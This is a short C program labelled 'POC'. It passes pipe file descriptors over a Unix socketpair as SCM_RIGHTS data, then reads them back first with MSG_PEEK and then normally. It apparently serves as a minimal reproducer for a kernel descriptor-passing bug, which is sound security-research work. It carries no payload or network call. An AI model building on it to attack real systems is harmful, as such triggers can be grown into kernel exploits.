#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/uio.h>
#include <fcntl.h>
int main(void) {
    int sv[2], p[2];
    printf("POC\n");
    socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
    pipe(p);
    struct msghdr msg = {0};
    struct iovec iov;
    char ctrl[CMSG_SPACE(sizeof(int)*2)];
    char data = 'X';
    iov.iov_base = &data; iov.iov_len = 1;
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = ctrl; msg.msg_controllen = sizeof(ctrl);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET; cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int)*2);
    memcpy(CMSG_DATA(cmsg), p, sizeof(int)*2);
    msg.msg_controllen = CMSG_SPACE(sizeof(int)*2);
    sendmsg(sv[0], &msg, 0);
    memset(&msg,0,sizeof(msg));
    iov.iov_base = &data; iov.iov_len = 1;
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = ctrl; msg.msg_controllen = sizeof(ctrl);
    recvmsg(sv[1], &msg, MSG_PEEK);
    memset(&msg,0,sizeof(msg));
    iov.iov_base = &data; iov.iov_len = 1;
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = ctrl; msg.msg_controllen = sizeof(ctrl);
    recvmsg(sv[1], &msg, 0);
    close(p[0]); close(p[1]);
    close(sv[0]); close(sv[1]);
    printf("Done\n");
    return 0;
}
